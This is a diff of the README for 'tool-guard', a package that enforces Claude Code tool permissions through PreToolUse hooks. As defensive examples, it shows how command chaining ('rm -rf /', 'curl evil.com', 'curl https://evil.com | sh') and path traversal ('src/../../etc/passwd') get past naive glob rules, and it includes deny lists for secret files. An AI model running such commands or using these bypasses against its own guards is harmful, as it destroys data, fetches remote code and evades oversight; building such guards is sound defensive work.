@@ -3,7 +3,9 @@
 [![npm version](https://img.shields.io/npm/v/tool-guard.svg)](https://www.npmjs.com/package/tool-guard)
 [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
 
-A **reliable** permission system for Claude Code using PreToolUse hooks.
+> A PreToolUse hook that **actually enforces** permissions in Claude Code — typed config, glob patterns, and injection-proof command validation.
+
+---
 
 ## Why?
 
@@ -41,485 +43,372 @@ Example from issue #6631:
 
 ### The solution: PreToolUse hooks
 
-Hooks are **actually enforced** by Claude Code before any tool execution. This package provides a reliable permission system using hooks.
+Hooks are **actually enforced** by Claude Code before any tool execution. tool-guard provides a typed, injection-proof permission system built on hooks.
 
-## Installation
+---
 
-```bash
-pnpm i -D tool-guard
-```
-
-Or with npm:
+## Install
 
 ```bash
-npm install -D tool-guard
+pnpm add -D tool-guard
 ```
 
-## Quick Start
+## Quick start
 
-### 1. Create guard config
-
-Create `.claude/guard.config.ts` in your project:
+**1.** Create `.claude/guard.config.ts`:
 
 ```typescript
-import {
-  BashToolGuard,
-  EditToolGuard,
-  GlobToolGuard,
-  GrepToolGuard,
-  ReadToolGuard,
-  WriteToolGuard,
-  defineGuard,
-} from 'tool-guard'
+import { defineGuard } from 'tool-guard/guard'
+import { command, spread } from 'tool-guard/command'
+import { BashToolGuard } from 'tool-guard/guards/bash'
+import { ReadToolGuard } from 'tool-guard/guards/read'
+import { WriteToolGuard } from 'tool-guard/guards/write'
+import { EditToolGuard } from 'tool-guard/guards/edit'
+import { GlobToolGuard } from 'tool-guard/guards/glob'
+import { GrepToolGuard } from 'tool-guard/guards/grep'
+import { safeString } from 'tool-guard/extractables/safeString'
+import { safeBranch } from 'tool-guard/extractables/safeBranch'
+import { safeFilePath } from 'tool-guard/extractables/safeFilePath'
+import { safePackage } from 'tool-guard/extractables/safePackage'
 
 export default defineGuard({
-  // File operations - wildcards are safe here
-  Read: ReadToolGuard({
-    allow: ['*'],
-    deny: ['*.env', '.env.*', '**/secrets/**'],
-  }),
-  Write: WriteToolGuard({
-    allow: ['*'],
-    deny: ['*.env'],
-  }),
-  Edit: EditToolGuard({
-    allow: ['*'],
-    deny: ['*.env'],
-  }),
-  Glob: GlobToolGuard(['*']),
-  Grep: GrepToolGuard(['*']),
+  // ⚠️ "*.env" does NOT match ".env" — each * must consume at least one character
+  Read: ReadToolGuard({ allow: ['*'], deny: ['.env', '*.env', '.env.*'] }),
+  Write: WriteToolGuard({ allow: ['*'], deny: ['.env', '*.env', '.env.*'] }),
+  Edit: EditToolGuard({ allow: ['*'], deny: ['.env', '*.env', '.env.*'] }),
+  Glob: GlobToolGuard({ allow: ['*'] }),
+  Grep: GrepToolGuard({ allow: ['*'] }),
 
-  // Bash - use SAFE_* placeholders, not wildcards
-  Bash: BashToolGuard([
-    'git status',
-    'git log',
-    'git diff',
-    'git add ...SAFE_FILE_PATH',
-    'git commit -m SAFE_STRING',
-    'git checkout SAFE_BRANCH',
-    'git push',
-    'git pull',
-    'pnpm install',
-    'pnpm test',
-    'pnpm build',
-  ]),
+  Bash: BashToolGuard({ allow: [
+    command`git status`,
+    command`git diff`,
+    command`git add ${spread(safeFilePath)}`,
+    command`git commit -m ${safeString}`,
+    command`git checkout ${safeBranch}`,
+    command`git push`,
+    command`git pull`,
+    command`pnpm install`,
+    command`pnpm add -D ${safePackage}`,
+    command`pnpm test`,
+    command`pnpm build`,
+  ] }),
 })
 ```
 
-### 2. Configure the hook
-
-Add to `.claude/settings.local.json`:
+**2.** Add the hook to `.claude/settings.local.json`:
 
 ```json
 {
   "hooks": {
-    "PreToolUse": [
-      {
-        "matcher": ".*",
-        "hooks": [
-          {
-            "type": "command",
-            "command": "pnpm exec tool-guard"
-          }
-        ]
-      }
-    ]
+    "PreToolUse": [{
+      "matcher": ".*",
+      "hooks": [{
+        "type": "command",
+        "command": "pnpm exec tool-guard"
+      }]
+    }]
   }
 }
 ```
 
-> **Note:** Use `npx tool-guard` if using npm instead of pnpm.
+**3.** Done. Unconfigured tools are **denied by default**.
 
-### 3. Done!
-
-Claude Code will now **actually** respect your permission rules.
-
-## Config Syntax
-
-### ToolGuard Factories
-
-Each tool uses a factory function that pre-configures the extractor:
-
-```typescript
-import {
-  BashToolGuard,      // extractor: 'command'
-  ReadToolGuard,      // extractor: 'file_path'
-  WriteToolGuard,     // extractor: 'file_path'
-  EditToolGuard,      // extractor: 'file_path'
-  MultiEditToolGuard, // extractor: 'file_path'
-  GlobToolGuard,      // extractor: 'pattern'
-  GrepToolGuard,      // extractor: 'pattern'
-  WebFetchToolGuard,  // extractor: 'url'
-  WebSearchToolGuard, // extractor: 'query'
-  TaskToolGuard,      // extractor: 'subagent_type'
-  NotebookEditToolGuard, // extractor: 'notebook_path'
-  ToolGuardFactory,   // for custom extractors
-} from 'tool-guard'
-```
-
-### Array shorthand
-
-Pass an array for allow-only policies:
-
-```typescript
-// These are equivalent:
-BashToolGuard(['git status', 'git pull'])
-BashToolGuard({ allow: ['git status', 'git pull'] })
-```
-
-### Object form
-
-Use object form for deny and validate:
-
-```typescript
-ReadToolGuard({
-  allow: ['*'],
-  deny: ['*.env', '*.key'],
-  validate: (path) => path.includes('..') ? 'No traversal' : undefined,
-})
-```
-
-### Deny by default
-
-Tools not in your config are **denied by default**. You must explicitly configure each tool you want to allow.
-
-```typescript
-export default defineGuard({
-  // Only Read and Bash are configured
-  // All other tools (Write, Edit, Task, etc.) are DENIED
-  Read: ReadToolGuard(['*']),
-  Bash: BashToolGuard(['git status']),
-})
-```
-
-### Custom tools
-
-For custom or MCP tools, use `ToolGuardFactory` with a custom extractor:
-
-```typescript
-export default defineGuard({
-  // Create a guard for the 'operation' field
-  LSP: ToolGuardFactory(['operation'])({
-    allow: ['goToDefinition', 'findReferences'],
-  }),
-
-  // For complex logic, write a ToolGuard function directly
-  CustomTool: (input) => {
-    const action = String(input.action ?? '')
-    if (action === 'dangerous') {
-      return { allowed: false, reason: 'Blocked', suggestion: 'Use safe action' }
-    }
-    return { allowed: true }
-  },
-})
-```
-
-## Pattern Syntax
-
-### WARNING: Avoid wildcards in Bash patterns
-
-**Wildcards (`*`) in Bash patterns are dangerous.** Claude can bypass them using `&&`, `||`, `;`, or pipes:
-
-```typescript
-// DANGEROUS - Claude can bypass this:
-BashToolGuard(['git *'])
-
-// Claude can run:
-// "git status && rm -rf /"     ← matches "git *"
-// "git log; curl evil.com"     ← matches "git *"
-```
-
-**Always use SAFE_* placeholders instead:**
-
-```typescript
-// SAFE - injection characters are rejected:
-BashToolGuard([
-  'git commit -m SAFE_STRING',
-  'git checkout SAFE_BRANCH',
-  'git add ...SAFE_FILE_PATH',
-])
-
-// These are blocked:
-// "git commit -m \"fix\" && rm -rf /"  ← SAFE_STRING rejects &&
-// "git checkout main; curl evil.com"  ← SAFE_BRANCH rejects ;
-```
-
-### Glob patterns
-
-| Pattern | Matches |
-|---------|---------|
-| `git status` | Exact match only |
-| `git *` | Anything starting with "git " |
-| `*.ts` | Anything ending with ".ts" |
-| `src/*.ts` | "src/" + anything + ".ts" |
-| `*` | Everything |
-
-> **Rule of thumb:** Use SAFE_*_FILE_PATH for file tools when you need path boundary protection, and SAFE_* placeholders for Bash commands.
-
-### WARNING: Glob patterns in file tools are vulnerable to path traversal
-
-**Glob patterns like `src/*` can be bypassed** using path traversal:
-
-```typescript
-// VULNERABLE - Claude can bypass this:
-ReadToolGuard(['src/*'])
-
-// Claude can read:
-// "src/../.env"     ← matches "src/*" but reads .env
-// "src/../../etc/passwd" ← matches "src/*" but escapes project
-```
-
-**Use SAFE_*_FILE_PATH placeholders instead:**
-
-```typescript
-// SAFE - path traversal is blocked:
-ReadToolGuard(['src/SAFE_INTERNAL_FILE_PATH'])
-
-// These are blocked:
-// "src/../.env"     ← SAFE_INTERNAL_FILE_PATH rejects traversal
-// "../etc/passwd"   ← doesn't start with "src/"
-```
-
-| Placeholder | Use case |
-|-------------|----------|
-| `SAFE_INTERNAL_FILE_PATH` | Any file within project directory |
-| `SAFE_EXTERNAL_FILE_PATH` | Absolute paths (e.g., `/usr/bin/node`) |
-| `SAFE_FILE_PATH` | Either internal or external |
-
-### SAFE_* Placeholders
-
-**Use these instead of wildcards for Bash patterns.** They validate captured values and reject shell metacharacters:
-
-| Placeholder | Description | Valid Example |
-|-------------|-------------|---------------|
-| `SAFE_STRING` | Quoted string with safe chars | `"fix bug"` |
-| `SAFE_FILE_PATH` | Safe file path (no metacharacters) | `src/app.ts` |
-| `SAFE_INTERNAL_FILE_PATH` | File path within project | `src/app.ts` |
-| `SAFE_EXTERNAL_FILE_PATH` | Absolute file path | `/usr/bin/node` |
-| `SAFE_NUMBER` | Positive integer | `42` |
-| `SAFE_COMMIT_HASH` | Git SHA-1 (40 hex chars) | `abc123...` |
-| `SAFE_SHORT_HASH` | Short git hash (7-40 chars) | `abc1234` |
-| `SAFE_BRANCH` | Git branch name | `feature/new` |
-| `SAFE_URL` | HTTP/HTTPS URL (no credentials) | `https://example.com` |
-| `SAFE_PACKAGE` | npm package name | `@types/node` |
-
-### Spread operator
-
-Use `...` prefix for multiple space-separated values:
-
-```typescript
-BashToolGuard([
-  // Matches: git add file1.ts file2.ts file3.ts
-  'git add ...SAFE_FILE_PATH',
-])
-```
-
-## Examples
-
-### Whitelist mode (recommended)
-
-```typescript
-import {
-  BashToolGuard,
-  EditToolGuard,
-  GlobToolGuard,
-  GrepToolGuard,
-  NotebookEditToolGuard,
-  ReadToolGuard,
-  TaskToolGuard,
-  WebFetchToolGuard,
-  WebSearchToolGuard,
-  WriteToolGuard,
-  defineGuard,
-} from 'tool-guard'
-
-export default defineGuard({
-  // File operations (wildcards are safe here)
-  Read: ReadToolGuard(['*']),
-  Write: WriteToolGuard(['*']),
-  Edit: EditToolGuard(['*']),
-  Glob: GlobToolGuard(['*']),
-  Grep: GrepToolGuard(['*']),
-  NotebookEdit: NotebookEditToolGuard(['*']),
-
-  // Git - use SAFE_* placeholders
-  Bash: BashToolGuard([
-    'git status',
-    'git log',
-    'git log *',  // Safe: git log options don't execute code
-    'git diff',
-    'git diff SAFE_FILE_PATH',
-    'git add ...SAFE_FILE_PATH',
-    'git commit -m SAFE_STRING',
-    'git checkout SAFE_BRANCH',
-    'git checkout -b SAFE_BRANCH',
-    'git push',
-    'git push origin SAFE_BRANCH',
-    'git pull',
-    'git merge SAFE_BRANCH',
-
-    // Package managers - be specific
-    'pnpm install',
-    'pnpm add SAFE_PACKAGE',
-    'pnpm add -D SAFE_PACKAGE',
-    'pnpm test',
-    'pnpm build',
-    'pnpm lint',
-
-    // Safe read-only commands
-    'ls',
-    'ls SAFE_FILE_PATH',
-    'pwd',
-    'cat SAFE_FILE_PATH',
-    'head -n SAFE_NUMBER SAFE_FILE_PATH',
-    'tail -n SAFE_NUMBER SAFE_FILE_PATH',
-  ]),
-
-  // Web tools
-  WebFetch: WebFetchToolGuard(['*']),
-  WebSearch: WebSearchToolGuard(['*']),
-
-  // Agent tools
-  Task: TaskToolGuard(['*']),
-})
-```
-
-### Protect sensitive files (glob approach)
-
-```typescript
-import {
-  EditToolGuard,
-  ReadToolGuard,
-  WriteToolGuard,
-  defineGuard,
-} from 'tool-guard'
-
-export default defineGuard({
-  Read: ReadToolGuard({
-    allow: ['*'],
-    deny: [
-      '*.env',
-      '.env.*',
-      '**/secrets/**',
-      '**/*.pem',
-      '**/*.key',
-      '**/credentials*',
-    ],
-  }),
-  Write: WriteToolGuard({
-    allow: ['*'],
-    deny: ['*.env', '.env.*'],
-  }),
-  Edit: EditToolGuard({
-    allow: ['*'],
-    deny: ['*.env', '.env.*'],
-  }),
-})
-```
-
-### Restrict to specific directory (secure approach)
-
-Using `SAFE_INTERNAL_FILE_PATH` prevents path traversal attacks:
-
-```typescript
-import {
-  EditToolGuard,
-  ReadToolGuard,
-  WriteToolGuard,
-  defineGuard,
-} from 'tool-guard'
-
-export default defineGuard({
-  // Only allow files in src/ - path traversal is blocked
-  Read: ReadToolGuard('src/SAFE_INTERNAL_FILE_PATH'),
-  Write: WriteToolGuard('src/SAFE_INTERNAL_FILE_PATH'),
-  Edit: EditToolGuard('src/SAFE_INTERNAL_FILE_PATH'),
-
-  // Or allow entire project but block external files
-  // Read: ReadToolGuard('SAFE_INTERNAL_FILE_PATH'),
-})
-```
-
-## Environment Variables
-
-| Variable | Values | Description |
-|----------|--------|-------------|
-| `CLAUDE_PROJECT_DIR` | path | Project root for `SAFE_INTERNAL_FILE_PATH` validation (default: `cwd`) |
-| `GUARD_LOG` | `debug`, `info`, `warn`, `error` | Log level (default: `info`) |
-| `GUARD_STDERR` | `true`, `false` | Also output logs to stderr (default: `false`) |
-
-`SAFE_INTERNAL_FILE_PATH` uses `CLAUDE_PROJECT_DIR` to determine the project boundary. If not set, defaults to the current working directory.
-
-## Logging
-
-Logs are written to `.claude/logs/guard.log`.
-
-- **`debug`**: All tool requests and decisions (verbose)
-- **`info`**: Denied requests only (default, recommended)
-- **`warn`**: Warnings and errors only
-- **`error`**: Errors only
-
-`GUARD_STDERR` is useful for manual testing when you want to see logs directly in the terminal instead of checking the log file.
-
-```bash
-# Debug mode - see all tool requests
-GUARD_LOG=debug claude
-
-# Debug with stderr output (for manual testing)
-GUARD_LOG=debug GUARD_STDERR=true pnpm exec tool-guard
-```
+---
 
 ## How it works
 
-1. Claude Code calls the hook before each tool execution
-2. The hook receives tool name and input via stdin (JSON)
-3. It checks against your `guard.config.ts` rules
-4. It returns `allow` or `deny` via stdout (JSON)
-5. Claude Code **enforces** the decision (unlike native permissions)
-
 ```
-┌─────────────┐     stdin      ┌──────────────┐     stdout     ┌─────────────┐
-│ Claude Code │ ──────────────▶│ tool-guard │ ──────────────▶│ Claude Code │
-│             │   HookInput    │              │  HookResponse  │             │
-└─────────────┘                └──────────────┘                └─────────────┘
-                                      │
-                                      ▼
-                          ┌────────────────────────┐
-                          │ guard.config.ts  │
-                          └────────────────────────┘
+┌─────────────┐     stdin (JSON)     ┌──────────────┐     stdout (JSON)    ┌─────────────┐
+│ Claude Code │ ───────────────────▶ │  tool-guard  │ ──────────────────▶ │ Claude Code │
+│             │  { toolName, input } │              │  { allow | deny }   │  (enforced)  │
+└─────────────┘                      └──────┬───────┘                     └─────────────┘
+                                            │
+                                            ▼
+                                 ┌────────────────────┐
+                                 │  guard.config.ts   │
+                                 └────────────────────┘
 ```
 
-## Comparison
+Before every tool call, Claude Code sends the tool name and input as JSON to the hook via stdin. tool-guard loads your config, evaluates the rules, and returns `allow` or `deny` via stdout. Claude Code **enforces** it — no bypass possible.
 
-| Feature | Native `permissions` | This package |
-|---------|---------------------|--------------|
-| Deny Read/Write/Edit | Ignored | Enforced |
-| Deny Bash commands | Partially works | Enforced |
-| Allow patterns | Auto-approves prompts | Auto-approves |
-| Wildcards | Unreliable | Full glob support |
-| Injection protection | None | SAFE_* validators |
-| Type-safe config | None | Full TypeScript |
-| Custom validation | None | `validate` function |
-| Logging | None | Configurable |
+---
+
+## Key concepts
+
+### Deny by default
+
+Tools not in your config are **denied**. You must explicitly configure each tool you want to allow.
+
+### Glob patterns — the OneOrMany rule
+
+Every `*` wildcard must consume **at least one character**. This means `*.env` does **NOT** match `.env`:
+
+| Pattern | `.env` | `production.env` | `.env.local` |
+|---------|--------|-------------------|--------------|
+| `.env` | **yes** | no | no |
+| `*.env` | **no** | **yes** | no |
+| `.env.*` | no | no | **yes** |
+
+You need **all three patterns** to cover all env file variants. See [Pattern matching](./docs/pattern-matching.md) for details and a [Vite env preset](./docs/reusable-policies.md#preset-vite-env-files).
+
+### Command templates — injection-proof Bash
+
+Glob patterns are **dangerous** for Bash — `"git status && rm -rf /"` matches `"git *"`. The `command` template splits on `&&`, `||`, `|`, `;` and validates each part separately:
+
+```typescript
+command`git commit -m ${safeString}`
+// "git commit -m "fix" && rm -rf /" → DENIED (each part validated independently)
+```
+
+See [Command templates](./docs/command-templates.md) for composition splitting, the `spread()` modifier, and backtracking.
+
+### Extractables — typed validators
+
+Extractables perform two-phase validation (extraction + security checks) inside command templates:
+
+| Extractable | What it matches | Import |
+|-------------|----------------|--------|
+| `greedy` | Any safe characters (quote-aware) | `tool-guard/extractables/greedy` |
+| `safeString` | Quoted string (`"..."` or `'...'`) | `tool-guard/extractables/safeString` |
+| `safeFilePath` | File path with scope isolation | `tool-guard/extractables/safeFilePath` |
+| `safeBranch` | Git branch name | `tool-guard/extractables/safeBranch` |
+| `safePackage` | npm package specifier | `tool-guard/extractables/safePackage` |
+| `safeNumber` | Positive integer | `tool-guard/extractables/safeNumber` |
+| `safeUrl` | HTTP/HTTPS URL without credentials | `tool-guard/extractables/safeUrl` |
+| `safeCommitHash` | 40-char hex SHA-1 | `tool-guard/extractables/safeCommitHash` |
+| `safeShortHash` | 7–40 char hex hash | `tool-guard/extractables/safeShortHash` |
+
+Each comes in two forms: **`camelCase`** (default, no restrictions) and **`PascalCase()`** (factory with glob policies):
+
+```typescript
+command`cat ${safeFilePath}`                         // any safe file path
+command`cat ${SafeFilePath({ allow: ['src/**'] })}`  // only files in src/
+command`pnpm ${Greedy({ allow: ['test', 'build', 'lint'] })}`     // only these subcommands
+```
+
+See [Extractables](./docs/extractables.md) for all extractables including 9 path variants with scope isolation.
+
+---
+
+## Full whitelist example
+
+```typescript
+import { defineGuard } from 'tool-guard/guard'
+import { command, spread } from 'tool-guard/command'
+import { BashToolGuard } from 'tool-guard/guards/bash'
+import { ReadToolGuard } from 'tool-guard/guards/read'
+import { WriteToolGuard } from 'tool-guard/guards/write'
+import { EditToolGuard } from 'tool-guard/guards/edit'
+import { GlobToolGuard } from 'tool-guard/guards/glob'
+import { GrepToolGuard } from 'tool-guard/guards/grep'
+import { NotebookEditToolGuard } from 'tool-guard/guards/notebookEdit'
+import { TaskToolGuard } from 'tool-guard/guards/task'
+import { WebFetchToolGuard } from 'tool-guard/guards/webFetch'
+import { WebSearchToolGuard } from 'tool-guard/guards/webSearch'
+import { greedy } from 'tool-guard/extractables/greedy'
+import { safeString } from 'tool-guard/extractables/safeString'
+import { safeBranch } from 'tool-guard/extractables/safeBranch'
+import { safeFilePath } from 'tool-guard/extractables/safeFilePath'
+import { safeNumber } from 'tool-guard/extractables/safeNumber'
+import { safePackage } from 'tool-guard/extractables/safePackage'
+
+export default defineGuard({
+  // File operations — wildcards are safe here
+  Read: ReadToolGuard({ allow: ['*'] }),
+  Write: WriteToolGuard({ allow: ['*'] }),
+  Edit: EditToolGuard({ allow: ['*'] }),
+  Glob: GlobToolGuard({ allow: ['*'] }),
+  Grep: GrepToolGuard({ allow: ['*'] }),
+  NotebookEdit: NotebookEditToolGuard({ allow: ['*'] }),
+
+  // Git — use SAFE extractables
+  Bash: BashToolGuard({ allow: [
+    command`git status`,
+    command`git log ${greedy}`,  // safe: git log options don't execute code
+    command`git diff`,
+    command`git diff ${safeFilePath}`,
+    command`git add ${spread(safeFilePath)}`,
+    command`git commit -m ${safeString}`,
+    command`git checkout ${safeBranch}`,
+    command`git checkout -b ${safeBranch}`,
+    command`git push`,
+    command`git push origin ${safeBranch}`,
+    command`git pull`,
+    command`git merge ${safeBranch}`,
+
+    // Package managers — be specific
+    command`pnpm install`,
+    command`pnpm add ${safePackage}`,
+    command`pnpm add -D ${safePackage}`,
+    command`pnpm test`,
+    command`pnpm build`,
+    command`pnpm lint`,
+
+    // Safe read-only commands
+    command`ls`,
+    command`ls ${safeFilePath}`,
+    command`pwd`,
+    command`cat ${safeFilePath}`,
+    command`head -n ${safeNumber} ${safeFilePath}`,
+    command`tail -n ${safeNumber} ${safeFilePath}`,
+  ] }),
+
+  // Web & agents
+  WebFetch: WebFetchToolGuard({ allow: ['*'] }),
+  WebSearch: WebSearchToolGuard({ allow: ['*'] }),
+  Task: TaskToolGuard({ allow: ['*'] }),
+})
+```
+
+---
+
+## Reusable policies
+
+Since `guard.config.ts` is plain TypeScript, you can extract reusable deny/allow arrays and share them across guards:
+
+```typescript
+// deny-patterns.ts
+export const DENY_ENV_FILES = ['.env', '*.env', '.env.*'] as const
+export const DENY_SECRETS = ['**/*.pem', '**/*.key', '**/credentials*'] as const
+export const DENY_SENSITIVE = [...DENY_ENV_FILES, ...DENY_SECRETS] as const
+```
+
+```typescript
+// commands.ts
+import { command, spread } from 'tool-guard/command'
+import { safeFilePath } from 'tool-guard/extractables/safeFilePath'
+import { safeBranch } from 'tool-guard/extractables/safeBranch'
+import { safeString } from 'tool-guard/extractables/safeString'
+
+export const GIT_COMMANDS = [
+  command`git status`,
+  command`git diff`,
+  command`git add ${spread(safeFilePath)}`,
+  command`git commit -m ${safeString}`,
+  command`git checkout ${safeBranch}`,
+  command`git push`,
+  command`git pull`,
+] as const
+```
+
+```typescript
+// guard.config.ts
+import { defineGuard } from 'tool-guard/guard'
+import { BashToolGuard } from 'tool-guard/guards/bash'
+import { ReadToolGuard } from 'tool-guard/guards/read'
+import { DENY_SENSITIVE } from './deny-patterns'
+import { GIT_COMMANDS } from './commands'
+
+export default defineGuard({
+  Read: ReadToolGuard({ allow: ['*'], deny: [...DENY_SENSITIVE] }),
+  Bash: BashToolGuard({ allow: [...GIT_COMMANDS] }),
+})
+```
+
+See [Reusable policies](./docs/reusable-policies.md) for more examples including a complete [Vite env files preset](./docs/reusable-policies.md#preset-vite-env-files).
+
+---
+
+## Logs
+
+Logs are written to `.claude/logs/guard.log`. Set `GUARD_LOG` to control verbosity:
+
+| Variable | Default | Values |
+|----------|---------|--------|
+| `GUARD_LOG` | `info` | `debug`, `info`, `warn`, `error` |
+| `GUARD_STDERR` | `false` | Also output logs to stderr |
+| `CLAUDE_PROJECT_DIR` | `cwd` | Project root for path validation |
+
+**`info` level** (default) — only denied requests:
+
+```
+[2026-02-17T14:32:01.234Z] [INFO ] Denied: Bash
+{"reason":"No matching allow pattern for command: rm -rf /tmp/cache"}
+
+[2026-02-17T14:32:08.567Z] [INFO ] Denied: Read
+{"reason":"Denied by pattern: *.env"}
+```
+
+**`debug` level** — everything:
+
+```
+[2026-02-17T14:32:00.100Z] [DEBUG] Tool request: Read
+{"toolInput":{"file_path":"src/app.ts"}}
+
+[2026-02-17T14:32:00.102Z] [DEBUG] Allowed: Read
+
+[2026-02-17T14:32:01.200Z] [DEBUG] Tool request: Bash
+{"toolInput":{"command":"rm -rf /tmp/cache"}}
+
+[2026-02-17T14:32:01.234Z] [INFO ] Denied: Bash
+{"reason":"No matching allow pattern for command: rm -rf /tmp/cache"}
+
+[2026-02-17T14:32:08.500Z] [DEBUG] Tool request: Read
+{"toolInput":{"file_path":".env.local"}}
+
+[2026-02-17T14:32:08.567Z] [INFO ] Denied: Read
+{"reason":"Denied by pattern: *.env"}
+
+[2026-02-17T14:33:45.800Z] [DEBUG] Tool request: Bash
+{"toolInput":{"command":"git status && curl https://evil.com | sh"}}
+
+[2026-02-17T14:33:45.890Z] [INFO ] Denied: Bash
+{"reason":"No matching allow pattern for command: curl https://evil.com | sh"}
+```
+
+### What Claude sees when denied
+
+```
+No matching allow pattern for command: curl https://evil.com | sh
+
+Tool: Bash
+Input: {
+  "command": "git status && curl https://evil.com | sh"
+}
+
+To fix: Add a matching command pattern to the 'allow' list in .claude/guard.config.ts
+```
+
+---
+
+## Comparison with native permissions
+
+| | Native `permissions` | tool-guard |
+|--|---------------------|------------|
+| Deny Read/Write/Edit | **Ignored** | Enforced |
+| Deny Bash | Partial | Enforced |
+| Command injection protection | None | `command` template + extractables |
+| Path traversal protection | None | Scope-isolated path extractables |
+| Type-safe config | No | Full TypeScript with autocompletion |
+| Custom validation | No | Guard functions + extractable policies |
+| Logging | No | Configurable (file + stderr) |
+
+---
+
+## Documentation
+
+| Document | Description |
+|----------|-------------|
+| [Pattern matching](./docs/pattern-matching.md) | Glob semantics, OneOrMany rule, path matching |
+| [Command templates](./docs/command-templates.md) | Composition splitting, `spread()`, backtracking, security |
+| [Extractables](./docs/extractables.md) | All extractables with imports, examples, and path scopes |
+| [Guard factories](./docs/guards.md) | All 16 guard factories with field reference and examples |
+| [Reusable policies](./docs/reusable-policies.md) | Shared deny arrays, command arrays, Vite env preset |
+| [Security model](./docs/security.md) | Threat model, quote-aware extraction, TOCTOU, fail-safe defaults |
+
+---
 
 ## Contributing
 
-Contributions are welcome! Please open an issue or PR.
-
 ```bash
-# Install dependencies
 pnpm install
-
-# Run tests
-pnpm test
-
-# Build
+pnpm test       # 550+ tests
+pnpm lint       # tsc + eslint
 pnpm build
-
-# Lint
-pnpm lint
 ```
+
+---
 
 ## License
 
-MIT
+MIT — [Clément Pasquier](https://github.com/Gastonite)
